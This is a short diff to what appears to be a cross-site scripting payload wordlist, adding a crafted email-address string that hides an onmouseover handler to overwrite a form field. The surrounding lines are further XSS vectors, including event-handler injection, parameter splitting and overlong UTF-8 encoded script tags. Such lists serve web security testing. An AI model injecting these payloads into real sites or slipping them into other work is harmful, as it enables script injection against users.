@@ -11,3 +11,4 @@ location='javascript:alert(0)';
 </a onmousemove="alert(1)">
 ?injection=<script+&injection=>alert(1)></script>
 %C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+"kebby22"+"onmouseover=this.closest('form').children[3].value='hack';//"@kebby.it"
